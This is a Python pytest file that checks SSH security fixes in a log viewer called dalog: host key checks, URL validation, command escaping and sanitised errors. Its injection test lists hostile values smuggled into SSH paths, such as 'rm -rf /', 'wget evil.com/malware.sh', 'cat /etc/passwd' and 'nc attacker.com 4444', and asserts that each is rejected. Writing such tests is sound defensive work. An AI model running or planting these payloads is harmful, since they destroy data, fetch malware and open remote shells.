"""
Security tests for SSH functionality in dalog.
Tests to ensure SSH vulnerabilities have been properly fixed.
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
from paramiko import SSHException, AuthenticationException, BadHostKeyException

from dalog.core.remote_reader import (
    SSHLogReader,
    create_secure_ssh_client,
    DalogSecureHostKeyPolicy,
    is_ssh_url
)


@pytest.mark.ci_skip
class TestSSHHostKeyVerification:
    """Test SSH host key verification security."""

    def test_host_key_policy_rejects_unknown_hosts(self):
        """Test that the secure host key policy rejects unknown hosts."""
        policy = DalogSecureHostKeyPolicy()
        
        # Mock the required parameters
        client = Mock()
        hostname = "unknown-host.example.com"
        key = Mock()
        key.get_name.return_value = "ssh-rsa"
        key.get_fingerprint.return_value = Mock()
        key.get_fingerprint.return_value.hex.return_value = "abc123def456"
        
        # Should raise SSHException with informative message
        with pytest.raises(SSHException) as exc_info:
            policy.missing_host_key(client, hostname, key)
        
        error_msg = str(exc_info.value)
        assert "Host key verification failed" in error_msg
        assert hostname in error_msg
        assert "ssh-rsa" in error_msg
        assert "abc123def456" in error_msg

    @patch('dalog.core.remote_reader.SSHClient')
    def test_create_secure_ssh_client_loads_host_keys(self, mock_ssh_client):
        """Test that secure SSH client properly loads host keys."""
        mock_client = Mock()
        mock_ssh_client.return_value = mock_client
        
        # Test with strict host key checking
        client = create_secure_ssh_client("test-host", 22, "user", strict_host_key_checking=True)
        
        # Should load system and user host keys
        mock_client.load_system_host_keys.assert_called_once()
        mock_client.load_host_keys.assert_called()
        
        # Should set secure host key policy
        mock_client.set_missing_host_key_policy.assert_called_once()
        policy_arg = mock_client.set_missing_host_key_policy.call_args[0][0]
        assert isinstance(policy_arg, DalogSecureHostKeyPolicy)

    @patch('dalog.core.remote_reader.SSHClient')
    def test_secure_ssh_client_uses_warning_policy_when_not_strict(self, mock_ssh_client):
        """Test that non-strict mode uses WarningPolicy instead of AutoAddPolicy."""
        mock_client = Mock()
        mock_ssh_client.return_value = mock_client
        
        client = create_secure_ssh_client("test-host", 22, "user", strict_host_key_checking=False)
        
        # Should use WarningPolicy, not AutoAddPolicy
        mock_client.set_missing_host_key_policy.assert_called_once()
        # The actual policy type verification would require importing WarningPolicy


@pytest.mark.ci_skip
class TestSSHCommandInjection:
    """Test SSH command injection prevention."""

    def test_malicious_path_in_ssh_url_rejected(self):
        """Test that SSH URLs with malicious paths are rejected during parsing."""
        malicious_urls = [
            'user@host:/var/log/app.log"; rm -rf /; echo "',
            'user@host:/var/log/app.log$(wget evil.com/malware.sh)',
            "user@host:/var/log/app.log'; cat /etc/passwd; echo '",
            'user@host:/var/log/app.log|nc attacker.com 4444',
            'user@host:/var/log/app.log&& curl evil.com',
            'user@host:/var/log/app.log`whoami`',
        ]
        
        for malicious_url in malicious_urls:
            with pytest.raises(ValueError) as exc_info:
                SSHLogReader(malicious_url)
            
            assert "Invalid SSH URL" in str(exc_info.value)

    @patch('dalog.core.remote_reader.create_secure_ssh_client')
    def test_command_execution_uses_proper_escaping(self, mock_create_client):
        """Test that command execution properly escapes arguments."""
        # Mock SSH client and connection
        mock_ssh_client = Mock()
        mock_create_client.return_value = mock_ssh_client
        
        # Mock SFTP client for file stat
        mock_sftp = Mock()
        mock_ssh_client.open_sftp.return_value = mock_sftp
        mock_file_stat = Mock()
        mock_file_stat.st_size = 1000
        mock_sftp.stat.return_value = mock_file_stat
        
        # Mock command execution
        mock_stdin = Mock()
        mock_stdout = Mock()
        mock_stderr = Mock()
        mock_stdout.read.return_value = b"100\n"
        mock_stderr.read.return_value = b""
        mock_stdout.channel.recv_exit_status.return_value = 0
        mock_ssh_client.exec_command.return_value = (mock_stdin, mock_stdout, mock_stderr)
        
        # Create SSH reader with a safe path
        reader = SSHLogReader("user@host:/var/log/app.log")
        reader.open()
        
        # Test _count_lines method
        reader._count_lines()
        
        # Verify that exec_command was called with properly escaped command
        mock_ssh_client.exec_command.assert_called()
        called_command = mock_ssh_client.exec_command.call_args[0][0]
        
        # shlex.join doesn't quote paths that don't need it
        assert "wc -l /var/log/app.log" in called_command

    @patch('dalog.core.remote_reader.create_secure_ssh_client')
    def test_tail_command_prevents_injection(self, mock_create_client):
        """Test that tail command execution prevents injection."""
        # Mock SSH client setup
        mock_ssh_client = Mock()
        mock_create_client.return_value = mock_ssh_client
        
        mock_sftp = Mock()
        mock_ssh_client.open_sftp.return_value = mock_sftp
        mock_file_stat = Mock()
        mock_file_stat.st_size = 1000
        mock_sftp.stat.return_value = mock_file_stat
        
        # Mock command execution for both wc and tail
        mock_stdin = Mock()
        mock_stdout = Mock()
        mock_stderr = Mock()
        mock_stdout.read.return_value = b"100\nline1\nline2\n"
        mock_stderr.read.return_value = b""
        mock_stdout.channel.recv_exit_status.return_value = 0
        mock_ssh_client.exec_command.return_value = (mock_stdin, mock_stdout, mock_stderr)
        
        reader = SSHLogReader("user@host:/var/log/app.log")
        reader.open()
        
        # Test reading tail lines
        list(reader._read_tail_lines(10))
        
        # Verify proper command construction
        calls = mock_ssh_client.exec_command.call_args_list
        
        # Should have calls for both wc and tail
        assert len(calls) >= 1
        
        # Check that tail command is properly escaped
        tail_call = None
        for call in calls:
            if 'tail' in call[0][0]:
                tail_call = call[0][0]
                break
        
        if tail_call:
            # shlex.join doesn't quote numbers, so we expect: tail -n 10 /var/log/app.log
            assert "tail -n 10" in tail_call
            assert "/var/log/app.log" in tail_call


@pytest.mark.ci_skip
class TestSSHInputValidation:
    """Test SSH input validation and sanitization."""

    def test_ssh_url_validation_rejects_malicious_inputs(self):
        """Test SSH URL validation with various malicious inputs."""
        invalid_urls = [
            "",  # Empty
            "a" * 3000,  # Too long
            "user@host:path-without-leading-slash",  # Invalid path
            "user@host:/path/with/../traversal",  # Path traversal
            "user@host:65536:/valid/path",  # Invalid port
            "user@host:0:/valid/path",  # Invalid port
            "user@host:/path/with\x00null",  # Null byte
            "user@host:/path/with spaces and|pipe",  # Invalid characters
            "user@host:/path/with$variables",  # Shell variables
            "user@host:/path/with`backticks`",  # Command substitution
        ]
        
        for invalid_url in invalid_urls:
            with pytest.raises(ValueError):
                SSHLogReader(invalid_url)

    def test_ssh_url_validation_accepts_valid_inputs(self):
        """Test that valid SSH URLs are accepted."""
        valid_urls = [
            "user@host:/var/log/app.log",
            "user@host.domain.com:/var/log/app.log",
            "user@host:2222:/var/log/app.log",
            "ssh://user@host:/var/log/app.log",
            "ssh://user@host:2222:/var/log/app.log",
            "user.name@host-name.com:/var/log/app-file.log",
        ]
        
        for valid_url in valid_urls:
            try:
                # Should not raise exception during URL parsing
                reader = SSHLogReader(valid_url)
                # Basic validation - should have parsed correctly
                assert reader.user
                assert reader.host
                assert reader.remote_path.startswith('/')
            except ValueError:
                pytest.fail(f"Valid URL rejected: {valid_url}")

    def test_port_validation(self):
        """Test port number validation."""
        # Valid ports
        valid_ports = ["22", "2222", "8022", "65535"]
        for port in valid_ports:
            url = f"user@host:{port}:/var/log/app.log"
            reader = SSHLogReader(url)
            assert 1 <= reader.port <= 65535

        # Invalid ports
        invalid_ports = ["0", "65536", "99999", "-1"]
        for port in invalid_ports:
            url = f"user@host:{port}:/var/log/app.log"
            with pytest.raises(ValueError):
                SSHLogReader(url)

    def test_component_length_limits(self):
        """Test that SSH URL components respect length limits."""
        # Username too long
        long_user = "a" * 100
        with pytest.raises(ValueError):
            SSHLogReader(f"{long_user}@host:/var/log/app.log")
        
        # Hostname too long  
        long_host = "a" * 300
        with pytest.raises(ValueError):
            SSHLogReader(f"user@{long_host}:/var/log/app.log")
        
        # Path too long
        long_path = "/var/log/" + "a" * 5000
        with pytest.raises(ValueError):
            SSHLogReader(f"user@host:{long_path}")


@pytest.mark.ci_skip
class TestSSHConnectionSecurity:
    """Test SSH connection security settings."""

    @patch('dalog.core.remote_reader.create_secure_ssh_client')
    def test_connection_uses_secure_defaults(self, mock_create_client):
        """Test that SSH connections use secure default settings."""
        mock_ssh_client = Mock()
        mock_create_client.return_value = mock_ssh_client
        
        mock_sftp = Mock()
        mock_ssh_client.open_sftp.return_value = mock_sftp
        mock_file_stat = Mock()
        mock_file_stat.st_size = 1000
        mock_sftp.stat.return_value = mock_file_stat
        
        reader = SSHLogReader("user@host:/var/log/app.log")
        reader.open()
        
        # Verify connection was called with secure settings
        mock_ssh_client.connect.assert_called_once()
        connect_kwargs = mock_ssh_client.connect.call_args[1]
        
        # Should have timeout
        assert 'timeout' in connect_kwargs
        assert connect_kwargs['timeout'] > 0
        
        # Should disable weak algorithms
        assert 'disabled_algorithms' in connect_kwargs
        disabled = connect_kwargs['disabled_algorithms']
        assert 'ssh-dss' in disabled.get('pubkeys', [])

    @patch('dalog.core.remote_reader.create_secure_ssh_client')
    def test_connection_timeout_validation(self, mock_create_client):
        """Test that connection timeout is properly validated."""
        # Valid timeout
        reader = SSHLogReader("user@host:/var/log/app.log", connection_timeout=30)
        assert reader.connection_timeout == 30
        
        # Test that invalid timeouts would be caught by configuration validation
        # (This would be caught at the configuration level, not in SSHLogReader directly)

    def test_ssh_url_detection(self):
        """Test SSH URL detection function."""
        ssh_urls = [
            "user@host:/path",
            "ssh://user@host:/path",
            "user@host:2222:/path"
        ]
        
        non_ssh_urls = [
            "/local/path",
            "http://example.com",
            "file:///local/path",
            "invalid-format"
        ]
        
        for url in ssh_urls:
            assert is_ssh_url(url), f"Should detect as SSH URL: {url}"
        
        for url in non_ssh_urls:
            assert not is_ssh_url(url), f"Should not detect as SSH URL: {url}"


@pytest.mark.ci_skip
class TestSSHErrorHandling:
    """Test SSH error handling and information disclosure prevention."""

    @patch('dalog.core.remote_reader.create_secure_ssh_client')
    def test_connection_errors_dont_leak_information(self, mock_create_client):
        """Test that connection errors don't leak sensitive information."""
        mock_ssh_client = Mock()
        mock_create_client.return_value = mock_ssh_client
        
        # Test different types of SSH exceptions  
        mock_key = Mock()
        mock_key.get_base64.return_value = "AAAA..."
        mock_expected_key = Mock()
        mock_expected_key.get_base64.return_value = "BBBB..."
        
        exceptions_to_test = [
            (AuthenticationException("auth failed"), ConnectionError, "authentication failed"),
            (BadHostKeyException("host", mock_key, mock_expected_key), ConnectionError, "Host key verification failed"),
            (SSHException("ssh error"), ConnectionError, "SSH connection error"),
        ]
        
        for original_exc, expected_exc_type, expected_msg_part in exceptions_to_test:
            mock_ssh_client.connect.side_effect = original_exc
            
            reader = SSHLogReader("user@host:/var/log/app.log")
            
            with pytest.raises(expected_exc_type) as exc_info:
                reader.open()
            
            # Error message should be sanitized
            error_msg = str(exc_info.value)
            assert expected_msg_part.lower() in error_msg.lower()
            
            # Should not contain the original detailed error
            assert "auth failed" not in error_msg
            
            # Reset for next test
            mock_ssh_client.connect.side_effect = None

    @patch('dalog.core.remote_reader.create_secure_ssh_client')
    def test_file_not_found_error_sanitized(self, mock_create_client):
        """Test that file not found errors don't expose full paths."""
        mock_ssh_client = Mock()
        mock_create_client.return_value = mock_ssh_client
        
        mock_sftp = Mock()
        mock_ssh_client.open_sftp.return_value = mock_sftp
        mock_sftp.stat.side_effect = IOError("No such file")
        
        reader = SSHLogReader("user@host:/var/log/sensitive-app.log")
        
        with pytest.raises(FileNotFoundError) as exc_info:
            reader.open()
        
        error_msg = str(exc_info.value)
        # Should not expose the full path, just the filename
        assert "sensitive-app.log" in error_msg
        assert "/var/log/" not in error_msg